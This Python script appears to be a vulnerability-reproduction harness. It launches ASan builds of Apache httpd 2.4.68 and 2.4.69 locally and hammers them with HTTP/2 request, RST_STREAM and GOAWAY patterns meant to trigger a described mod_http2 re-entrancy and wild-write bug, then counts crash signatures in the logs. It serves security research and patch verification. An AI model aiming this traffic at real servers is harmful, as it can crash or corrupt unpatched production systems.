#!/usr/bin/env python3
"""Adjacent lane L3: CVE-2026-57941 mod_http2 bbtmp re-entrancy / wild write.

2.4.68 shares session->bbtmp between on_send_data_cb(), ev_stream_closed()
and c1 input assembly; m_stream_cleanup() is re-entrant and the two iqueues
are grown from m->pool under poll_lock while other m->pool allocations happen
under m->lock.  2.4.69 replaces all three with per-call brigades, an
in_stream_cleanup/mplx_cleanup_done guard and a separate iqueue pool.

Traffic: loopback h2c GETs of a large response (forces on_send_data_cb),
immediate RST_STREAM (forces stream cleanup), and client GOAWAY while streams
are open (the 2.4.69 GOAWAY hunk). Many connections in parallel exercise the
cross-lock iqueue growth. No CVE-2026-119618 header groom is used, so the
main-lane closed primitive cannot confound the result.
"""
import os
import re
import signal
import struct
import subprocess
import sys
import threading
import socket
import time


from h2client import H2Connection, ConnectionClosed, ProtocolError, default_headers

HERE = os.path.dirname(__file__)
BASE = os.path.join(HERE, "l3")
LOGS = os.path.join(HERE, "logs")
RUN = os.path.join(BASE, "run")
DOCROOT = os.path.join(BASE, "docroot")
BIG = os.path.join(DOCROOT, "big.bin")
for d in (LOGS, RUN, DOCROOT):
    os.makedirs(d, exist_ok=True)
if not os.path.exists(BIG):
    with open(BIG, "wb") as f:
        f.write(b"A" * (512 * 1024))

SIGS = ("AddressSanitizer", "heap-use-after-free", "double-free",
        "SEGV", "Segmentation fault", "AH00051", "runtime error",
        " Attempting free", "stream not found", "assertion", "mutex",
        "thread-safety")


def conf_for(version, port):
    root = os.path.join(BASE, "install-%s-asan" % version)
    return """ServerRoot "{root}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule http2_module modules/mod_http2.so
ServerName localhost
ErrorLog "{err}"
LogLevel info
Protocols h2c http/1.1
H2Direct on
DocumentRoot "{docroot}"
<Directory "{docroot}">
    Require all granted
</Directory>
""".format(root=root, pid=os.path.join(RUN, "l3-%s.pid" % version),
           port=port, err=os.path.join(LOGS, "l3-%s-error.log" % version),
           docroot=DOCROOT)


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    with open(pidfile) as f:
        for line in f:
            try:
                pid = int(line.strip())
            except ValueError:
                continue
            try:
                os.kill(pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
    for _ in range(30):
        if not os.path.exists(pidfile):
            return
        time.sleep(0.1)
    try:
        os.unlink(pidfile)
    except FileNotFoundError:
        pass


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.requests = 0
        self.frames = 0
        self.closed = 0
        self.goaways = 0

    def bump(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)


def hammer(host, port, deadline, stats, streams, goaway):
    try:
        conn = H2Connection(host, port, timeout=5.0)
        conn.handshake()
    except (OSError, ProtocolError, ConnectionClosed):
        stats.bump("closed")
        return
    sid = 1
    try:
        while time.time() < deadline:
            for i in range(streams):
                if time.time() >= deadline:
                    break
                try:
                    if i % 3 == 1:
                        # Large request body: read_and_feed() holds client
                        # DATA in session->bbtmp while nghttp2 can invoke
                        # on_send_data_cb() for another stream's response.
                        conn.send_request_headers(
                            sid, default_headers(
                                method="POST", path="/big.bin",
                                extra=[("content-type",
                                        "application/octet-stream")]),
                            end_stream=False)
                        conn.send_data(sid, b"B" * 32768, end_stream=True)
                    else:
                        conn.send_request_headers(
                            sid, default_headers(method="GET",
                                                 path="/big.bin"),
                            end_stream=True)
                    # RST while the c2 worker is still draining the 512 KB
                    # body: the c1 stream-cleanup path re-enters bbtmp.
                    if i % 2 == 0:
                        conn.send_rst_stream(sid, 8)
                except (OSError, ConnectionClosed):
                    stats.bump("closed")
                    return
                sid += 2
                stats.bump("requests")
            if goaway:
                # Client GOAWAY with open streams: the 2.4.69 fix stops
                # transiting straight to H2_SESSION_ST_DONE here.
                try:
                    conn.send_frame(0x7, 0, 0,
                                    struct.pack(">II", sid, 0))
                    stats.bump("goaways")
                except OSError:
                    stats.bump("closed")
                    return
            conn.sock.settimeout(0.15)
            try:
                for _ in range(streams * 3):
                    conn.read_frame()
                    stats.bump("frames")
            except socket.timeout:
                pass  # idle, not a closed connection: keep the load going
            except (OSError, ConnectionClosed):
                stats.bump("closed")
                return
    finally:
        conn.close()


def drive(port, duration, connections, streams, goaway):
    stats = Stats()
    deadline = time.time() + duration
    threads = [threading.Thread(target=hammer,
                                args=("127.0.0.1", port, deadline, stats,
                                      streams, goaway), daemon=True)
               for _ in range(connections)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=duration + 10)
    return stats


def probe(version, port, duration, connections, streams, goaway):
    err = os.path.join(LOGS, "l3-%s-error.log" % version)
    conf = os.path.join(RUN, "l3-%s.conf" % version)
    with open(conf, "w") as f:
        f.write(conf_for(version, port))
    if os.path.exists(err):
        os.unlink(err)
    stop(os.path.join(RUN, "l3-%s.pid" % version))
    httpd = os.path.join(BASE, "install-%s-asan" % version, "bin", "httpd")
    srv = subprocess.Popen([httpd, "-f", conf],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(1.5)
    stats = drive(port, duration, connections, streams, goaway)
    stop(os.path.join(RUN, "l3-%s.pid" % version))
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    log = ""
    if os.path.exists(err):
        with open(err, errors="replace") as f:
            log = f.read()
    counts = {s: len(re.findall(s, log, re.I)) for s in SIGS}
    return dict(version=version, port=port, srv_rc=srv.returncode,
                requests=stats.requests, frames=stats.frames,
                closed=stats.closed, goaways=stats.goaways,
                signatures=counts, log_bytes=len(log), log_tail=log[-3000:])


def main():
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 20.0
    connections = int(sys.argv[2]) if len(sys.argv) > 2 else 8
    streams = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    goaway = (len(sys.argv) <= 4 or sys.argv[4] != "nogoaway")
    for version, port in (("2.4.68", 7268), ("2.4.69", 7269)):
        r = probe(version, port, duration, connections, streams, goaway)
        print("=== %s port %d ===" % (version, port), flush=True)
        print("srv_rc=%s requests=%d frames=%d closed=%d goaways=%d "
              "signatures=%s log_bytes=%d" %
              (r["srv_rc"], r["requests"], r["frames"], r["closed"],
               r["goaways"], r["signatures"], r["log_bytes"]), flush=True)
        print("LOG TAIL:\n" + r["log_tail"], flush=True)


if __name__ == "__main__":
    main()
